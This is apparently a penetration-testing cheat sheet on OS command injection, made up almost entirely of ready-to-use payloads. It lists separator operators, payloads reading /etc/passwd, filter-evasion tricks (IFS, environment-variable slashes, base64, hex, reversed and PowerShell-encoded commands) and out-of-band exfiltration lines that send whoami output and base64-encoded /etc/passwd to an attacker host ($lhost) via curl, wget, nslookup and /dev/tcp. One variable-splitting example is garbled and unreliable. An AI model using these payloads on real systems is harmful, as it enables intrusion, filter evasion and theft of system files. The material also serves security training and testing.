# Command Injection

## Table of Contents

- [Basic Command Injection](#basic-command-injection)
  - [Injection Operators](#injection-operators)
- [Filter Bypass](#filter-bypass)
  - [Space Bypass](#space-bypass)
  - [Slash Bypass](#slash-bypass)
  - [Character Bypass](#character-bypass)
  - [Case Manipulation](#case-manipulation)
  - [Encoding](#encoding)
- [Blind Command Injection](#blind-command-injection)
- [Windows Command Injection](#windows-command-injection)

---

## Basic Command Injection

### Injection Operators

| Operator | URL Encoded | Description | Example |
| :--- | :--- | :--- | :--- |
| `;` | `%3b` | Execute both commands | `; whoami` |
| `\n` | `%0a` | New line, execute second | `%0a whoami` |
| `&` | `%26` | Background first, execute both | `& whoami` |
| `\|` | `%7c` | Pipe output to second command | `\| whoami` |
| `&&` | `%26%26` | Execute second if first succeeds | `&& whoami` |
| `\|\|` | `%7c%7c` | Execute second if first fails | `\|\| whoami` |
| `` ` ` `` | `%60%60` | Subshell (Linux only) | `` `whoami` `` |
| `$()` | `%24%28%29` | Subshell (Linux only) | `$(whoami)` |

### Basic Payloads

```shell
; id
; whoami
; cat /etc/passwd
| id
| whoami
|| id
&& id
`id`
$(id)
```

### URL Encoded Payloads

```text
%3B%20id
%3B%20whoami
%7C%20id
%26%26%20id
%60id%60
%24%28id%29
```

---

## Filter Bypass

### Space Bypass

#### Linux

| Bypass | Description |
| :--- | :--- |
| `${IFS}` | Internal Field Separator |
| `$IFS$9` | IFS with 9th argument |
| `{cmd,arg}` | Brace expansion |
| `%09` | Tab character |
| `<` | Input redirection |
| `<>` | Read-write redirection |

```shell
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd
cat</etc/passwd
```

#### Windows

| Bypass | Description |
| :--- | :--- |
| `%09` | Tab character |
| `%PROGRAMFILES:~10,-5%` | Replaced with space (CMD) |
| `$env:PROGRAMFILES[10]` | Replaced with space (PowerShell) |

```cmd
type%09C:\Windows\win.ini
```

### Slash Bypass

#### Slash Bypass - Linux

```shell
${PATH:0:1}        # /
${HOME:0:1}        # /
```

Example:

```shell
cat ${PATH:0:1}etc${PATH:0:1}passwd
```

#### Slash Bypass - Windows

```cmd
%HOMEPATH:~0,-17%  # \ (CMD)
$env:HOMEPATH[0]   # \ (PowerShell)
```

### Character Bypass

#### Using Environment Variables

```shell
${LS_COLORS:10:1}  # ; character
$(tr '!-}' '"-~'<<<[)  # Shift character
```

#### Using Variables

```shell
a]a]a]a]a]a]a]a]@=who]a]a]a]a]a]a]a]a];b]a]a]a]a]a]a]a]a]=ami
$a$b
```

### Case Manipulation

```shell
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
```

### Encoding

#### Base64

```shell
# Encode
echo 'cat /etc/passwd' | base64
# Y2F0IC9ldGMvcGFzc3dkCg==

# Execute
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkCg==)
echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | bash
```

#### Hex

```shell
echo 'whoami' | xxd -p
# 77686f616d690a

echo 77686f616d69 | xxd -r -p | bash
```

#### Reversed Commands

```shell
# Reverse
echo 'whoami' | rev
# imaohw

# Execute
$(rev<<<'imaohw')
```

### Quote Bypass

```shell
w'h'o'a'm'i
w"h"o"a"m"i
who$@ami
who\ami
```

### Backslash Bypass

```shell
w\ho\am\i
c\at /e\tc/pas\swd
```

---

## Blind Command Injection

### Time-Based

```shell
; sleep 5
| sleep 5
& sleep 5
`sleep 5`
$(sleep 5)
```

### Out-of-Band (OOB)

#### DNS Exfiltration

```shell
; nslookup $(whoami).$lhost
; ping -c 1 $(whoami).$lhost
; curl http://$(whoami).$lhost
```

#### HTTP Exfiltration

```shell
; curl http://$lhost/$(whoami)
; wget http://$lhost/$(cat /etc/passwd | base64 -w 0)
; curl http://$lhost/?data=$(id | base64)
```

### Output Redirection

```shell
; whoami > /var/www/html/output.txt
; cat /etc/passwd > /dev/tcp/$lhost/4444
```

---

## Windows Command Injection

### Windows Basic Payloads

```cmd
& whoami
| whoami
&& whoami
|| whoami
```

### PowerShell

```powershell
; powershell -c "whoami"
| powershell -c "Get-Process"
```

### Bypass Techniques

#### Caret (^) Escape

```cmd
w^ho^am^i
c^m^d /c whoami
```

#### Environment Variable

```cmd
%COMSPEC% /c whoami
```

#### Case Variation

```cmd
WhOaMi
WHOAMI
```

#### Reversed String (PowerShell)

```powershell
$("imaohw"[-1..-20] -join '')
```

#### Base64 (PowerShell)

```powershell
# Encode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# Result: dwBoAG8AYQBtAGkA

# Execute
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
powershell -enc dwBoAG8AYQBtAGkA
```

---

## Payload Cheat Sheet

| Payload | Description |
| :--- | :--- |
| `; id` | Semicolon separator |
| `\| id` | Pipe to command |
| `&& id` | AND operator |
| `\|\| id` | OR operator |
| `$(id)` | Subshell |
| `` `id` `` | Backtick subshell |
| `${IFS}` | Space bypass |
| `${PATH:0:1}` | Slash bypass |
| `$(rev<<<'imaohw')` | Reversed command |
| `bash<<<$(base64 -d<<<...)` | Base64 bypass |

---

## ðŸ“š See Also

### Related Web Attacks

- **[Web Application Analysis](7.0.Web-Application-Analysis.md)** - Reconnaissance and vulnerability discovery
- **[SSTI](7.6.SSTI.md)** - Server-Side Template Injection (similar exploitation)
- **[File Inclusion](7.3.File-Inclusion.md)** - LFI/RFI attacks

### Reverse Shell & Post-Exploitation

- **[Reverse Shell](../6.OS-Command/6.3.Reverse-Shell.md)** - Shell payloads for command injection
- **[GTFOBins Linux](../4.Privilege-Escalation/4.3.GTFOBins-Linux.md)** - After initial access
